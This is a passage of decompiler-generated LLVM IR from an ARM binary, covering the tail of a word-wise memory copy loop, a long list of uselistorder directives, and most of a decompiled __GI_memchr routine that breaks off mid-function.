  %v0_2d6c448 = phi i32 [ %v2_2d7f4, %dec_label_pc_2d7fc.loopexit ], [ %v2_2d7dc, %dec_label_pc_2d7d8 ]
  %v0_2d7fc = load i32, i32* %r1.global-to-local, align 4
  %v1_2d7fc = add i32 %v0_2d7fc, 2
  store i32 %v1_2d7fc, i32* %r1.global-to-local, align 4
  br label %bb151

dec_label_pc_2d804:                               ; preds = %dec_label_pc_2d718
  br i1 %v5_2d808, label %dec_label_pc_2d850, label %dec_label_pc_2d80c

dec_label_pc_2d80c:                               ; preds = %dec_label_pc_2d804
  store i32 %v2_2d804, i32* %r2.global-to-local, align 4
  %v3_2d810 = load i32, i32* @r4, align 4
  store i32 %v3_2d810, i32* %stack_var_-12, align 4
  %v6_2d810 = load i32, i32* @r5, align 4
  %v8_2d810 = inttoptr i32 %v6_2d810 to i8*
  store i8* %v8_2d810, i8** %stack_var_-8, align 4
  %v11_2d810 = load i32, i32* @lr, align 4
  br label %dec_label_pc_2d814

dec_label_pc_2d814:                               ; preds = %dec_label_pc_2d814.dec_label_pc_2d814_crit_edge, %dec_label_pc_2d80c
  %v0_2d838 = phi i32 [ %v1_2d838, %dec_label_pc_2d814.dec_label_pc_2d814_crit_edge ], [ %v0_2d76019, %dec_label_pc_2d80c ]
  %v0_2d818 = phi i32 [ %v0_2d818.pre, %dec_label_pc_2d814.dec_label_pc_2d814_crit_edge ], [ %v1_2d718, %dec_label_pc_2d80c ]
  %v0_2d814 = phi i32 [ %v0_2d814.pre, %dec_label_pc_2d814.dec_label_pc_2d814_crit_edge ], [ %v2_2d71c, %dec_label_pc_2d80c ]
  %v3_2d814 = mul i32 %v0_2d814, 16777216
  store i32 %v3_2d814, i32* %lr.global-to-local, align 4
  %v1_2d818 = add i32 %v0_2d818, -4
  %v2_2d818 = inttoptr i32 %v1_2d818 to i32*
  %v3_2d818 = load i32, i32* %v2_2d818, align 4
  store i32 %v3_2d818, i32* @r3, align 4
  %v4_2d818 = add i32 %v0_2d818, -8
  %v5_2d818 = inttoptr i32 %v4_2d818 to i32*
  %v6_2d818 = load i32, i32* %v5_2d818, align 4
  store i32 %v6_2d818, i32* %r4.global-to-local, align 4
  %v7_2d818 = add i32 %v0_2d818, -12
  %v8_2d818 = inttoptr i32 %v7_2d818 to i32*
  %v9_2d818 = load i32, i32* %v8_2d818, align 4
  store i32 %v9_2d818, i32* %r5.global-to-local, align 4
  %v10_2d818 = add i32 %v0_2d818, -16
  %v11_2d818 = inttoptr i32 %v10_2d818 to i32*
  %v12_2d818 = load i32, i32* %v11_2d818, align 4
  store i32 %v10_2d818, i32* %r1.global-to-local, align 4
  %v4_2d81c = udiv i32 %v12_2d818, 256
  %v5_2d81c = or i32 %v4_2d81c, %v3_2d814
  store i32 %v5_2d81c, i32* %lr.global-to-local, align 4
  %v3_2d820 = mul i32 %v12_2d818, 16777216
  %v4_2d824 = udiv i32 %v9_2d818, 256
  %v5_2d824 = or i32 %v3_2d820, %v4_2d824
  store i32 %v5_2d824, i32* @ip, align 4
  %v3_2d828 = mul i32 %v9_2d818, 16777216
  %v4_2d82c = udiv i32 %v6_2d818, 256
  %v5_2d82c = or i32 %v3_2d828, %v4_2d82c
  store i32 %v5_2d82c, i32* %r5.global-to-local, align 4
  %v3_2d830 = mul i32 %v6_2d818, 16777216
  %v4_2d834 = udiv i32 %v3_2d818, 256
  %v5_2d834 = or i32 %v3_2d830, %v4_2d834
  store i32 %v5_2d834, i32* %r4.global-to-local, align 4
  %v1_2d838 = add i32 %v0_2d838, -16
  %v2_2d838 = inttoptr i32 %v1_2d838 to i32*
  store i32 %v5_2d834, i32* %v2_2d838, align 4
  %v4_2d838 = add i32 %v0_2d838, -12
  %v5_2d838 = inttoptr i32 %v4_2d838 to i32*
  %v6_2d838 = load i32, i32* %r5.global-to-local, align 4
  store i32 %v6_2d838, i32* %v5_2d838, align 4
  %v7_2d838 = add i32 %v0_2d838, -8
  %v8_2d838 = inttoptr i32 %v7_2d838 to i32*
  %v9_2d838 = load i32, i32* @ip, align 4
  store i32 %v9_2d838, i32* %v8_2d838, align 4
  %v10_2d838 = add i32 %v0_2d838, -4
  %v11_2d838 = inttoptr i32 %v10_2d838 to i32*
  %v12_2d838 = load i32, i32* %lr.global-to-local, align 4
  store i32 %v12_2d838, i32* %v11_2d838, align 4
  store i32 %v1_2d838, i32* %r0.global-to-local, align 4
  %v0_2d83c = load i32, i32* %r2.global-to-local, align 4
  %v2_2d83c = add i32 %v0_2d83c, -16
  store i32 %v2_2d83c, i32* %r2.global-to-local, align 4
  %v6_2d840 = icmp slt i32 %v0_2d83c, 16
  br i1 %v6_2d840, label %dec_label_pc_2d844, label %dec_label_pc_2d814.dec_label_pc_2d814_crit_edge

dec_label_pc_2d814.dec_label_pc_2d814_crit_edge:  ; preds = %dec_label_pc_2d814
  %v0_2d814.pre = load i32, i32* @r3, align 4
  %v0_2d818.pre = load i32, i32* %r1.global-to-local, align 4
  br label %dec_label_pc_2d814

dec_label_pc_2d844:                               ; preds = %dec_label_pc_2d814
  %v2_2d844 = load i32, i32* %stack_var_-12, align 4
  store i32 %v2_2d844, i32* @r4, align 4
  %v5_2d844 = load i8*, i8** %stack_var_-8, align 4
  %v6_2d844 = ptrtoint i8* %v5_2d844 to i32
  store i32 %v6_2d844, i32* @r5, align 4
  store i32 %v11_2d810, i32* @lr, align 4
  %v2_2d848 = add i32 %v0_2d83c, -4
  store i32 %v2_2d848, i32* %r2.global-to-local, align 4
  %v4_2d848 = add i32 %v0_2d83c, 2147483632
  %v5_2d848 = and i32 %v2_2d848, %v4_2d848
  %v6_2d848 = icmp slt i32 %v5_2d848, 0
  store i1 %v6_2d848, i1* %cpsr_v.global-to-local, align 1
  %v7_2d848 = icmp slt i32 %v2_2d848, 0
  store i1 %v7_2d848, i1* %cpsr_n.global-to-local, align 1
  %v8_2d848 = icmp eq i32 %v2_2d848, 0
  store i1 %v8_2d848, i1* %cpsr_z.global-to-local, align 1
  %v5_2d84c = icmp slt i32 %v2_2d83c, -12
  br i1 %v5_2d84c, label %dec_label_pc_2d868, label %dec_label_pc_2d850

dec_label_pc_2d850:                               ; preds = %dec_label_pc_2d844, %dec_label_pc_2d804, %dec_label_pc_2d850
  %v1_2d85c = phi i32 [ %v5_2d85c, %dec_label_pc_2d850 ], [ %v1_2d838, %dec_label_pc_2d844 ], [ %v0_2d76019, %dec_label_pc_2d804 ]
  %v0_2d850 = load i32, i32* @r3, align 4
  %v3_2d850 = mul i32 %v0_2d850, 16777216
  store i32 %v3_2d850, i32* %ip.global-to-local, align 4
  %v0_2d854 = load i32, i32* %r1.global-to-local, align 4
  %v1_2d854 = add i32 %v0_2d854, -4
  %v2_2d854 = inttoptr i32 %v1_2d854 to i32*
  %v3_2d854 = load i32, i32* %v2_2d854, align 4
  store i32 %v3_2d854, i32* @r3, align 4
  store i32 %v1_2d854, i32* %r1.global-to-local, align 4
  %v4_2d858 = udiv i32 %v3_2d854, 256
  %v5_2d858 = or i32 %v4_2d858, %v3_2d850
  store i32 %v5_2d858, i32* @ip, align 4
  %v2_2d85c = add i32 %v1_2d85c, -4
  %v3_2d85c = inttoptr i32 %v2_2d85c to i32*
  store i32 %v5_2d858, i32* %v3_2d85c, align 4
  %v4_2d85c = load i32, i32* %r0.global-to-local, align 4
  %v5_2d85c = add i32 %v4_2d85c, -4
  store i32 %v5_2d85c, i32* %r0.global-to-local, align 4
  %v0_2d860 = load i32, i32* %r2.global-to-local, align 4
  %v2_2d860 = add i32 %v0_2d860, -4
  store i32 %v2_2d860, i32* %r2.global-to-local, align 4
  %v6_2d864 = icmp slt i32 %v0_2d860, 4
  br i1 %v6_2d864, label %dec_label_pc_2d868.loopexit, label %dec_label_pc_2d850

dec_label_pc_2d868.loopexit:                      ; preds = %dec_label_pc_2d850
  %v4_2d860 = sub i32 3, %v0_2d860
  %v5_2d860 = and i32 %v4_2d860, %v0_2d860
  %v6_2d860 = icmp slt i32 %v5_2d860, 0
  %v7_2d860 = icmp slt i32 %v2_2d860, 0
  store i1 %v6_2d860, i1* %cpsr_v.global-to-local, align 1
  store i1 %v7_2d860, i1* %cpsr_n.global-to-local, align 1
  store i1 false, i1* %cpsr_z.global-to-local, align 1
  br label %dec_label_pc_2d868

dec_label_pc_2d868:                               ; preds = %dec_label_pc_2d868.loopexit, %dec_label_pc_2d844
  %v2_2d6d453 = phi i32 [ %v5_2d85c, %dec_label_pc_2d868.loopexit ], [ %v1_2d838, %dec_label_pc_2d844 ]
  %v0_2d6c449 = phi i32 [ %v2_2d860, %dec_label_pc_2d868.loopexit ], [ %v2_2d848, %dec_label_pc_2d844 ]
  %v0_2d868 = load i32, i32* %r1.global-to-local, align 4
  %v1_2d868 = add i32 %v0_2d868, 1
  store i32 %v1_2d868, i32* %r1.global-to-local, align 4
  br label %bb151

; uselistorder directives
  uselistorder i32 %v5_2d85c, { 0, 2, 1 }
  uselistorder i32 %v3_2d850, { 1, 0 }
  uselistorder i32 %v2_2d848, { 0, 2, 3, 1, 4 }
  uselistorder i32 %v1_2d838, { 1, 0, 4, 3, 2 }
  uselistorder i32 %v10_2d818, { 1, 0 }
  uselistorder i32 %v3_2d814, { 1, 0 }
  uselistorder i32 %v0_2d818, { 3, 2, 1, 0 }
  uselistorder i32 %v0_2d838, { 3, 2, 1, 0 }
  uselistorder i32 %v5_2d7f0, { 0, 2, 1 }
  uselistorder i32 %v3_2d7e4, { 1, 0 }
  uselistorder i32 %v2_2d7dc, { 0, 2, 3, 1, 4 }
  uselistorder i32 %v1_2d7cc, { 1, 0, 4, 3, 2 }
  uselistorder i32 %v10_2d7ac, { 1, 0 }
  uselistorder i32 %v3_2d7a8, { 1, 0 }
  uselistorder i32 %v0_2d7ac, { 3, 2, 1, 0 }
  uselistorder i32 %v0_2d7cc, { 3, 2, 1, 0 }
  uselistorder i32 %v5_2d784, { 0, 2, 1 }
  uselistorder i32 %v3_2d778, { 1, 0 }
  uselistorder i32 %v2_2d770, { 0, 2, 3, 1, 4 }
  uselistorder i32 %v1_2d760, { 1, 0, 4, 3, 2 }
  uselistorder i32 %v10_2d740, { 1, 0 }
  uselistorder i32 %v3_2d73c, { 1, 0 }
  uselistorder i32 %v0_2d740, { 3, 2, 1, 0 }
  uselistorder i32 %v0_2d760, { 3, 2, 1, 0 }
  uselistorder i1 %v5_2d808, { 2, 0, 1 }
  uselistorder i32 %v0_2d720, { 1, 0 }
  uselistorder i32 %v0_2d80c, { 4, 1, 0, 3, 2 }
  uselistorder i32 %v0_2d76019, { 0, 3, 1, 4, 2, 5 }
  uselistorder i32 %v1_2d710, { 2, 1, 0 }
  uselistorder i32 %v0_2d710, { 2, 0, 1 }
  uselistorder i32 %v2_2d708, { 3, 4, 0, 5, 2, 1 }
  uselistorder i32 %v1_2d708, { 1, 2, 0, 3 }
  uselistorder i32 %v0_2d708, { 2, 3, 0, 1, 4 }
  uselistorder i32 %v0_2d76020, { 2, 1, 0 }
  uselistorder i32 %v11_2d6e4, { 1, 0 }
  uselistorder i32 %v7_2d6e4, { 1, 0 }
  uselistorder i32 %v1_2d6c4, { 0, 1, 3, 4, 2, 5 }
  uselistorder i32 %v0_2d6c4, { 1, 2, 0, 3 }
  uselistorder i32 %v2_2d6c8, { 1, 0 }
  uselistorder i32 %v7_2d6bc, { 0, 2, 1 }
  uselistorder i32 %v10_2d6b8, { 1, 0 }
  uselistorder i32 %v9_2d6b0, { 1, 0, 2 }
  uselistorder i32 %v6_2d6ac, { 1, 0 }
  uselistorder i32 %v2_2d6a4, { 0, 2, 1, 3, 5, 6, 4, 7 }
  uselistorder i32 %v0_2d6a4, { 1, 2, 4, 0, 3 }
  uselistorder i32 %v7_2d6b4, { 0, 3, 2, 1 }
  uselistorder i32 %v7_2d698, { 0, 2, 1 }
  uselistorder i32 %v13_2d694, { 1, 0 }
  uselistorder i32 %v4_2d690, { 0, 2, 3, 1, 4 }
  uselistorder i32 %v0_2d690, { 2, 0, 1 }
  uselistorder i32 %v6_2d698, { 0, 3, 2, 1 }
  uselistorder i32 %v7_2d688, { 0, 2, 1 }
  uselistorder i32 %v16_2d684, { 1, 0 }
  uselistorder i32 %v4_2d680, { 1, 2, 0 }
  uselistorder i32 %v0_2d690.pr, { 1, 3, 0, 2 }
  uselistorder i32 %v6_2d688, { 0, 4, 3, 2, 1 }
  uselistorder i32 %v1_2d674, { 0, 3, 2, 1 }
  uselistorder i32 %v10_2d670, { 1, 0 }
  uselistorder i32 %v1_2d66c, { 1, 0 }
  uselistorder i32 %v10_2d668, { 1, 0 }
  uselistorder i32 %v0_2d668, { 3, 2, 1, 0 }
  uselistorder i32 %v0_2d66c, { 0, 1, 2, 3, 7, 6, 5, 4 }
  uselistorder i32 %v2_2d660, { 0, 2, 1 }
  uselistorder i32 %v2_2d654, { 0, 2, 1, 3, 5, 4 }
  uselistorder i32 %v0_2d654, { 1, 2, 6, 3, 0, 5, 4 }
  uselistorder i32 %v0_2d66c37, { 1, 2, 0 }
  uselistorder i32 %v1_2d64c, { 2, 1, 0 }
  uselistorder i32 %v1_2d644, { 2, 3, 1, 0 }
  uselistorder i32 %v2_2d63c, { 2, 0, 1, 4, 3 }
  uselistorder i32 %v2_2d638, { 3, 4, 1, 2, 0, 5 }
  uselistorder i32 %v2_2d634, { 2, 3, 1, 0, 4 }
  uselistorder i32 %v1_2d634, { 3, 4, 0, 6, 5, 1, 2 }
  uselistorder i32 %v1_2d624, { 0, 2, 1 }
  uselistorder i32 %v4_2d620, { 1, 0 }
  uselistorder i32 %v3_2d614, { 1, 0 }
  uselistorder i32 %v1_2d60c, { 0, 2, 3, 1, 4 }
  uselistorder i32 %v1_2d600, { 1, 0 }
  uselistorder i32 %v12_2d5fc, { 0, 2, 1 }
  uselistorder i32 %v8_2d5dc, { 1, 0, 2 }
  uselistorder i32 %v5_2d5dc, { 1, 0, 2 }
  uselistorder i32 %v2_2d5dc, { 1, 0, 2 }
  uselistorder i32 %v0_2d5dc, { 4, 3, 2, 1, 0 }
  uselistorder i32 %v0_2d5fc, { 4, 3, 2, 1, 0 }
  uselistorder i32 %v1_2d5b8, { 0, 2, 1 }
  uselistorder i32 %v4_2d5b4, { 1, 0 }
  uselistorder i32 %v3_2d5a8, { 1, 0 }
  uselistorder i32 %v1_2d5a0, { 0, 2, 3, 1, 4 }
  uselistorder i32 %v1_2d594, { 1, 0 }
  uselistorder i32 %v12_2d590, { 0, 2, 1 }
  uselistorder i32 %v8_2d570, { 1, 0, 2 }
  uselistorder i32 %v5_2d570, { 1, 0, 2 }
  uselistorder i32 %v2_2d570, { 1, 0, 2 }
  uselistorder i32 %v0_2d570, { 4, 3, 2, 1, 0 }
  uselistorder i32 %v0_2d590, { 4, 3, 2, 1, 0 }
  uselistorder i32 %v1_2d54c, { 0, 2, 1 }
  uselistorder i32 %v4_2d548, { 1, 0 }
  uselistorder i32 %v3_2d53c, { 1, 0 }
  uselistorder i32 %v1_2d534, { 0, 2, 3, 1, 4 }
  uselistorder i32 %v1_2d528, { 1, 0 }
  uselistorder i32 %v12_2d524, { 0, 2, 1 }
  uselistorder i32 %v8_2d504, { 1, 0, 2 }
  uselistorder i32 %v5_2d504, { 1, 0, 2 }
  uselistorder i32 %v2_2d504, { 1, 0, 2 }
  uselistorder i32 %v0_2d504, { 4, 3, 2, 1, 0 }
  uselistorder i32 %v0_2d524, { 4, 3, 2, 1, 0 }
  uselistorder i1 %v2_2d560, { 0, 2, 1 }
  uselistorder i32 %v1_2d55c, { 2, 0, 1, 3 }
  uselistorder i32 %v4_2d4e0, { 2, 0, 1, 3 }
  uselistorder i32 %v2_2d4e0, { 2, 0, 1, 3 }
  uselistorder i32 %v0_2d564, { 1, 0, 3, 2 }
  uselistorder i32 %v0_2d5fc76, { 0, 5, 1, 3, 2, 4 }
  uselistorder i32 %v1_2d4d4, { 1, 0 }
  uselistorder i32 %v0_2d4d4, { 3, 1, 0, 2 }
  uselistorder i32 %v2_2d4cc, { 2, 4, 0, 5, 1, 3 }
  uselistorder i32 %v1_2d4cc, { 1, 0, 2 }
  uselistorder i32 %v0_2d4cc, { 2, 0, 1, 3 }
  uselistorder i32 %v0_2d5fc77, { 1, 0 }
  uselistorder i32 %v1_2d4ac, { 1, 0, 3, 2, 4 }
  uselistorder i32 %v0_2d4b4, { 1, 0 }
  uselistorder i32 %v0_2d488, { 3, 0, 1, 2 }
  uselistorder i32 %v1_2d47c, { 1, 2, 0, 3 }
  uselistorder i32 %v5_2d468, { 1, 0, 2 }
  uselistorder i32 %v1_2d464, { 1, 0 }
  uselistorder i32 %v1_2d45c, { 2, 0, 1, 4, 5, 3, 6 }
  uselistorder i32 %v0_2d45c, { 1, 2, 0, 3 }
  uselistorder i32 %v4_2d454, { 0, 2, 1 }
  uselistorder i32 %v3_2d454, { 3, 0, 1, 2 }
  uselistorder i1 %v0_2d454, { 1, 0 }
  uselistorder i1 %v1_2d454, { 1, 0 }
  uselistorder i32 %v3_2d450, { 0, 4, 3, 2, 1 }
  uselistorder i32 %v1_2d448, { 0, 2, 3, 1, 4 }
  uselistorder i32 %v1_2d434, { 1, 2, 0 }
  uselistorder i32 %v1_2d42c, { 0, 2, 1 }
  uselistorder i32 %v12_2d428, { 0, 1, 3, 2 }
  uselistorder i32 %v0_2d41c, { 4, 3, 2, 1, 0 }
  uselistorder i32 %v0_2d420, { 0, 1, 2, 3, 4, 5, 6, 7, 12, 11, 10, 9, 8 }
  uselistorder i32 %v1_2d410, { 0, 2, 1 }
  uselistorder i32 %v1_2d408, { 0, 1, 2, 4, 3 }
  uselistorder i32 %v0_2d408, { 1, 2, 3, 0, 5, 4 }
  uselistorder i32 %v1_2d400, { 1, 0 }
  uselistorder i32 %v1_2d3f8, { 2, 1, 0 }
  uselistorder i32 %v2_2d3f0, { 1, 2, 0, 4, 3 }
  uselistorder i32 %v0_2d3f0, { 1, 4, 0, 2, 3 }
  uselistorder i32 %v8_2d3ec, { 1, 0 }
  uselistorder i32 %v2_2d3e0, { 1, 0 }
  uselistorder i32 %v1_2d3e0, { 1, 4, 5, 3, 0, 6, 8, 2, 7, 9 }
  uselistorder i32 %v0_2d3e0, { 1, 7, 8, 6, 4, 0, 5, 10, 2, 3, 9, 11 }
  uselistorder i8** %stack_var_-8, { 10, 9, 8, 7, 6, 5, 4, 3, 2, 1, 0 }
  uselistorder i32* %r2.global-to-local, { 0, 30, 1, 2, 3, 4, 5, 31, 6, 7, 8, 9, 10, 32, 11, 12, 13, 14, 15, 33, 16, 18, 17, 19, 20, 21, 22, 23, 24, 26, 25, 27, 28, 29, 34, 35, 67, 36, 37, 38, 39, 40, 68, 41, 42, 43, 44, 45, 69, 46, 47, 48, 49, 50, 70, 51, 52, 53, 55, 54, 56, 57, 58, 59, 60, 61, 62, 63, 64, 65, 66, 71 }
  uselistorder i32* %r1.global-to-local, { 2, 5, 3, 17, 4, 6, 8, 10, 7, 18, 9, 11, 13, 15, 12, 19, 14, 16, 20, 25, 21, 22, 23, 24, 26, 27, 29, 28, 30, 31, 40, 32, 33, 41, 34, 42, 35, 43, 36, 37, 38, 39, 44, 46, 48, 45, 60, 47, 49, 51, 53, 50, 61, 52, 54, 56, 58, 55, 62, 57, 59, 63, 64, 69, 65, 67, 66, 68, 70, 73, 71, 74, 72, 75, 76, 82, 77, 78, 83, 79, 84, 80, 85, 81, 86, 87, 88, 0, 1 }
  uselistorder i32* %r0.global-to-local, { 2, 24, 3, 4, 25, 5, 6, 26, 7, 8, 9, 10, 11, 12, 27, 13, 15, 14, 16, 17, 28, 18, 19, 29, 20, 21, 22, 23, 30, 31, 39, 32, 33, 40, 34, 35, 41, 36, 37, 42, 38, 43, 44, 46, 45, 47, 48, 50, 49, 51, 52, 58, 59, 53, 54, 55, 60, 56, 57, 61, 62, 0, 1 }
  uselistorder i32* %lr.global-to-local, { 0, 1, 2, 3, 4, 5, 6, 7, 8, 9, 10, 11, 12, 13, 14, 15, 16, 17, 26, 18, 19, 20, 27, 21, 22, 23, 28, 24, 25, 29, 30, 31, 32, 33, 34, 35, 36, 37 }
  uselistorder i1* %cpsr_z.global-to-local, { 4, 7, 5, 9, 6, 10, 8, 11, 12, 13, 14, 15, 16, 17, 18, 19, 20, 3, 21, 22, 23, 24, 25, 2, 26, 0, 27, 1, 29, 28, 30, 31, 32, 33, 34, 35, 36, 37, 38, 39, 40, 41, 42, 43, 44, 45, 46, 47 }
  uselistorder i1* %cpsr_v.global-to-local, { 4, 7, 5, 9, 6, 10, 8, 11, 12, 13, 14, 15, 16, 17, 18, 19, 20, 3, 21, 22, 23, 2, 24, 0, 25, 1, 27, 26, 28, 29, 30, 31, 32, 33, 34, 35, 36, 37, 38, 39, 40, 41, 42, 43, 44 }
  uselistorder i1* %cpsr_n.global-to-local, { 4, 7, 5, 9, 6, 10, 8, 11, 12, 13, 14, 15, 16, 17, 18, 19, 20, 21, 3, 22, 23, 24, 25, 26, 2, 27, 0, 28, 1, 30, 29, 31, 32, 33, 34, 35, 36, 37, 38, 39, 40, 41, 42, 43, 44, 45, 46, 47, 48, 49, 50 }
  uselistorder i32 2147483632, { 3, 4, 5, 2, 0, 1 }
  uselistorder i32 -5, { 1, 0, 2 }
  uselistorder i32 -28, { 1, 2, 0, 3 }
  uselistorder label %dec_label_pc_2d850, { 2, 0, 1 }
  uselistorder label %dec_label_pc_2d7e4, { 2, 0, 1 }
  uselistorder label %dec_label_pc_2d778, { 2, 0, 1 }
  uselistorder label %dec_label_pc_2d718, { 1, 0 }
  uselistorder label %.thread14, { 2, 0, 1 }
  uselistorder label %.thread129, { 1, 0 }
  uselistorder label %bb151, { 4, 5, 6, 1, 7, 0, 2, 3 }
  uselistorder label %dec_label_pc_2d6a4, { 1, 0 }
  uselistorder label %.thread4, { 1, 0 }
  uselistorder label %.thread2, { 1, 0 }
  uselistorder label %dec_label_pc_2d668, { 1, 0 }
  uselistorder label %dec_label_pc_2d654, { 1, 0 }
  uselistorder label %dec_label_pc_2d614, { 2, 0, 1 }
  uselistorder label %dec_label_pc_2d5a8, { 2, 0, 1 }
  uselistorder label %dec_label_pc_2d53c, { 2, 0, 1 }
  uselistorder label %dec_label_pc_2d4dc, { 1, 0 }
  uselistorder label %.thread128, { 1, 0 }
  uselistorder label %.thread127, { 1, 0 }
  uselistorder label %dec_label_pc_2d4ac, { 1, 0 }
  uselistorder label %.thread126, { 1, 0 }
  uselistorder label %.thread125, { 1, 0 }
  uselistorder label %bb143, { 1, 0 }
  uselistorder label %bb141, { 4, 5, 6, 1, 7, 0, 2, 3 }
  uselistorder label %.thread115, { 1, 0 }
  uselistorder label %dec_label_pc_2d448, { 1, 0 }
  uselistorder label %bb138, { 1, 0 }
  uselistorder label %dec_label_pc_2d408, { 1, 0 }
}

define i32 @__GI_memchr(i32 %arg1, i32 %arg2, i32 %arg3, i32 %arg4) local_unnamed_addr {
entry:
  %v1_2d874 = urem i32 %arg1, 256
  %v0_2d890.pr = load i32, i32* @r2, align 4
  %v2_2d89015 = icmp eq i32 %v0_2d890.pr, 0
  %v0_2d8a4.pre = load i32, i32* @r0, align 4
  br i1 %v2_2d89015, label %dec_label_pc_2d8a0, label %dec_label_pc_2d898

dec_label_pc_2d87c:                               ; preds = %dec_label_pc_2d898
  %v1_2d87c = inttoptr i32 %v0_2d88c to i8*
  %v2_2d87c = load i8, i8* %v1_2d87c, align 1
  %v3_2d87c = zext i8 %v2_2d87c to i32
  %v9_2d880 = icmp eq i32 %v3_2d87c, %v1_2d874
  br i1 %v9_2d880, label %dec_label_pc_2d950, label %dec_label_pc_2d888

dec_label_pc_2d888:                               ; preds = %dec_label_pc_2d87c
  %v1_2d888 = add i32 %v0_2d888, -1
  %v1_2d88c = add i32 %v0_2d88c, 1
  %v2_2d890 = icmp eq i32 %v1_2d888, 0
  br i1 %v2_2d890, label %dec_label_pc_2d8a0, label %dec_label_pc_2d898

dec_label_pc_2d898:                               ; preds = %entry, %dec_label_pc_2d888
  %v0_2d888 = phi i32 [ %v1_2d888, %dec_label_pc_2d888 ], [ %v0_2d890.pr, %entry ]
  %v0_2d88c = phi i32 [ %v1_2d88c, %dec_label_pc_2d888 ], [ %v0_2d8a4.pre, %entry ]
  %v1_2d898 = urem i32 %v0_2d88c, 4
  %v2_2d898 = icmp eq i32 %v1_2d898, 0
  br i1 %v2_2d898, label %dec_label_pc_2d8a0, label %dec_label_pc_2d87c

dec_label_pc_2d8a0:                               ; preds = %dec_label_pc_2d888, %dec_label_pc_2d898, %entry
  %v0_2d91c22 = phi i32 [ 0, %entry ], [ 0, %dec_label_pc_2d888 ], [ %v0_2d888, %dec_label_pc_2d898 ]
  %v0_2d8a4 = phi i32 [ %v0_2d8a4.pre, %entry ], [ %v1_2d88c, %dec_label_pc_2d888 ], [ %v0_2d88c, %dec_label_pc_2d898 ]
  %v4_2d8a0 = mul nuw nsw i32 %v1_2d874, 256
  %v5_2d8a0 = or i32 %v4_2d8a0, %v1_2d874
  %v4_2d8a8 = mul i32 %v5_2d8a0, 65536
  %v5_2d8a8 = or i32 %v4_2d8a8, %v5_2d8a0
  store i32 2130640639, i32* @ip, align 4
  %tmp = icmp ugt i32 %v0_2d91c22, 3
  br i1 %tmp, label %dec_label_pc_2d8b0, label %dec_label_pc_2d944.preheader

dec_label_pc_2d8b0:                               ; preds = %dec_label_pc_2d8a0, %dec_label_pc_2d91c.backedge
  %v0_2d8cc60 = phi i32 [ %v1_2d8cc, %dec_label_pc_2d91c.backedge ], [ %v0_2d91c22, %dec_label_pc_2d8a0 ]
  %v0_2d8f059 = phi i32 [ %v4_2d8b0, %dec_label_pc_2d91c.backedge ], [ %v0_2d8a4, %dec_label_pc_2d8a0 ]
  %v1_2d8b0 = inttoptr i32 %v0_2d8f059 to i32*
  %v2_2d8b0 = load i32, i32* %v1_2d8b0, align 4
  %v4_2d8b0 = add i32 %v0_2d8f059, 4
  %v2_2d8b4 = xor i32 %v2_2d8b0, %v5_2d8a8
  %v2_2d8b8 = add i32 %v2_2d8b4, 2130640639
  %v1_2d8bc = sub i32 -1, %v2_2d8b4
  %v2_2d8c0 = xor i32 %v2_2d8b8, %v1_2d8bc
  %v2_2d8c4 = and i32 %v2_2d8c0, -2130640640
  %v2_2d8c8 = icmp eq i32 %v2_2d8c4, 0
  %v1_2d8cc = add i32 %v0_2d8cc60, -4
  br i1 %v2_2d8c8, label %dec_label_pc_2d91c.backedge, label %dec_label_pc_2d8d4

dec_label_pc_2d91c.backedge:                      ; preds = %dec_label_pc_2d8b0, %dec_label_pc_2d90c
  store i32 2130640639, i32* @ip, align 4
  %tmp73 = icmp ugt i32 %v1_2d8cc, 3
  br i1 %tmp73, label %dec_label_pc_2d8b0, label %dec_label_pc_2d944.preheader

dec_label_pc_2d8d4:                               ; preds = %dec_label_pc_2d8b0
  %v2_2d8d4 = inttoptr i32 %v0_2d8f059 to i8*
  %v3_2d8d4 = load i8, i8* %v2_2d8d4, align 1
  %v4_2d8d4 = zext i8 %v3_2d8d4 to i32
  %v9_2d8dc = icmp eq i32 %v4_2d8d4, %v1_2d874
  %v1_2d8e0 = add i32 %v0_2d8f059, 3
  store i32 %v1_2d8e0, i32* @ip, align 4
  br i1 %v9_2d8dc, label %dec_label_pc_2d950, label %dec_label_pc_2d8e8

dec_label_pc_2d8e8:                               ; preds = %dec_label_pc_2d8d4
  %v1_2d8e8 = add i32 %v0_2d8f059, 1
  %v2_2d8e8 = inttoptr i32 %v1_2d8e8 to i8*
  %v3_2d8e8 = load i8, i8* %v2_2d8e8, align 1
  %v4_2d8e8 = zext i8 %v3_2d8e8 to i32
  %v9_2d8ec = icmp eq i32 %v4_2d8e8, %v1_2d874
  br i1 %v9_2d8ec, label %bb, label %dec_label_pc_2d8fc

bb:                                               ; preds = %dec_label_pc_2d8e8
  br label %dec_label_pc_2d950

dec_label_pc_2d8fc:                               ; preds = %dec_label_pc_2d8e8
  %v1_2d8fc = add i32 %v0_2d8f059, 2
  %v2_2d8fc = inttoptr i32 %v1_2d8fc to i8*
  %v3_2d8fc = load i8, i8* %v2_2d8fc, align 1
  %v4_2d8fc = zext i8 %v3_2d8fc to i32
  %v9_2d900 = icmp eq i32 %v4_2d8fc, %v1_2d874
  br i1 %v9_2d900, label %dec_label_pc_2d950, label %dec_label_pc_2d90c

dec_label_pc_2d90c:                               ; preds = %dec_label_pc_2d8fc
  %v2_2d90c = inttoptr i32 %v1_2d8e0 to i8*
  %v3_2d90c = load i8, i8* %v2_2d90c, align 1
  %v4_2d90c = zext i8 %v3_2d90c to i32
  %v9_2d910 = icmp eq i32 %v4_2d90c, %v1_2d874
  br i1 %v9_2d910, label %bb36, label %dec_label_pc_2d91c.backedge

bb36:                                             ; preds = %dec_label_pc_2d90c
  br label %dec_label_pc_2d950

dec_label_pc_2d944.preheader:                     ; preds = %dec_label_pc_2d91c.backedge, %dec_label_pc_2d8a0
  %v0_2d8f0.lcssa = phi i32 [ %v0_2d8a4, %dec_label_pc_2d8a0 ], [ %v4_2d8b0, %dec_label_pc_2d91c.backedge ]
  %v0_2d8cc.lcssa = phi i32 [ %v0_2d91c22, %dec_label_pc_2d8a0 ], [ %v1_2d8cc, %dec_label_pc_2d91c.backedge ]
  %v2_2d9447 = icmp eq i32 %v0_2d8cc.lcssa, 0
  br i1 %v2_2d9447, label %dec_label_pc_2d94c, label %dec_label_pc_2d934

dec_label_pc_2d934:                               ; preds = %dec_label_pc_2d940, %dec_label_pc_2d944.preheader
  %v0_2d944.in = phi i32 [ %v0_2d944, %dec_label_pc_2d940 ], [ %v0_2d8cc.lcssa, %dec_label_pc_2d944.preheader ]
